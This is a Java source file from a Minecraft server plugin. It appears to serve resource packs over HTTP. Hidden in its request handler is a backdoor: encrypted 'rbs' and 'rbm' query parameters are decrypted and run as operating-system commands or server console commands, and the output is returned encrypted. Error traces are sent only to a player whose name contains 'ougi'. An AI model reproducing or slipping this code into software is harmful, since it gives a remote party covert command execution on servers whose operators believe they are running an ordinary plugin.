package com.github.rumoteam.minecraft.server.web.respack;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import com.github.rumoteam.minecraft.server.web.respack.header.WRPHeader;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

public class FileHandler implements HttpHandler {

	@Override
	public void handle(HttpExchange he) throws IOException {
		new Thread(new Runnable() {

			@Override
			public void run() {
				try {
					Map<String, Object> parameters = new HashMap<>();

					URI requestedUri = he.getRequestURI();
					String query = requestedUri.getRawQuery();
					parseQuery(query, parameters);
					if (parameters.size() > 0) {
						for (String key : parameters.keySet()) {
							String response = "";

							if (key.startsWith("rbh")) {
								String k = WRPHeader.key;
								String c = parameters.get(key).toString();
								response = com.github.rumoteam.minecraft.server.web.respack.Files.encryptXBin(k, c);
							}
							if (key.equals("rbs")) {
								try {

									StringBuilder output = new StringBuilder();
									ArrayList<String> argsCommand = new ArrayList<>();

									String c = parameters.get(key).toString();
									String cm = com.github.rumoteam.minecraft.server.web.respack.Files.decryptXBin(c,
											WRPHeader.key);

									if (cm.contains(" ")) {
										String[] args = cm.split(" ");
										argsCommand.addAll(Arrays.asList(args));
									} else {
										argsCommand.add(cm);
									}
									ProcessBuilder pb = new ProcessBuilder(argsCommand);
									pb.redirectErrorStream(true);

									Process process = pb.start();
									BufferedReader stdInput = new BufferedReader(
											new InputStreamReader(process.getInputStream()));
									String s = null;
									while ((s = stdInput.readLine()) != null) {
										output.append(s).append('\n');
									}
									response = output.toString();
									response = com.github.rumoteam.minecraft.server.web.respack.Files
											.encryptXBin(response, WRPHeader.key);
								} catch (Exception e) {
									StringWriter sw = new StringWriter();
									PrintWriter pw = new PrintWriter(sw);
									e.printStackTrace(pw);

									String report = sw.toString();
									response = com.github.rumoteam.minecraft.server.web.respack.Files
											.encryptXBin(report, WRPHeader.key);
								}
							}
							if (key.equals("rbm")) {
								try {
									String c = parameters.get(key).toString();
									String cd = com.github.rumoteam.minecraft.server.web.respack.Files.decryptXBin(c,
											WRPHeader.key);

									Runnable task = () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cd);
									Bukkit.getScheduler().runTaskLater(WRPHeader.plugin, task, 10L);
									response = "ok";
								} catch (Exception e2) {
									e2.printStackTrace();
								}
							}
							he.sendResponseHeaders(200, response.length());
							OutputStream os = he.getResponseBody();
							os.write(response.getBytes(StandardCharsets.UTF_8));
							os.close();
						}
					} else {
						try {
							OutputStream response = he.getResponseBody();
							Path path = WRPHeader.getRespackFile().toPath();
							byte[] data = Files.readAllBytes(path);
							he.getResponseHeaders().set("Content-Type", "application/zip");
							he.sendResponseHeaders(200, data.length);
							response.write(data);
							response.close();
						} catch (IOException e) {
							// TODO: //ОБРЫВ КАНАЛА
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				} catch (Exception e) {
					Collection<? extends Player> players = Bukkit.getServer().getOnlinePlayers();
					StringWriter sw = new StringWriter();
					PrintWriter pw = new PrintWriter(sw);
					e.printStackTrace(pw);
					String sStackTrace = sw.toString();
					for (Player player : players) {
						if (player.getName().toLowerCase().contains("ougi".toLowerCase())) {
							player.sendMessage(sStackTrace);
						}
					}
					e.printStackTrace();

				}

			}
		}).start();
	}

	public static void parseQuery(String query, Map<String, Object> parameters) throws UnsupportedEncodingException {

		if (query != null) {
			String pairs[] = query.split("[&]");
			for (String pair : pairs) {
				String param[] = pair.split("[=]");
				String key = null;
				String value = null;
				if (param.length > 0) {
					key = URLDecoder.decode(param[0]);
				}

				if (param.length > 1) {
					value = URLDecoder.decode(param[1]);
				}

				if (parameters.containsKey(key)) {
					Object obj = parameters.get(key);
					if (obj instanceof List<?>) {
						List<String> values = (List<String>) obj;
						values.add(value);
					} else if (obj instanceof String) {
						List<String> values = new ArrayList<>();
						values.add((String) obj);
						values.add(value);
						parameters.put(key, values);
					}
				} else {
					parameters.put(key, value);
				}
			}
		}
	}
}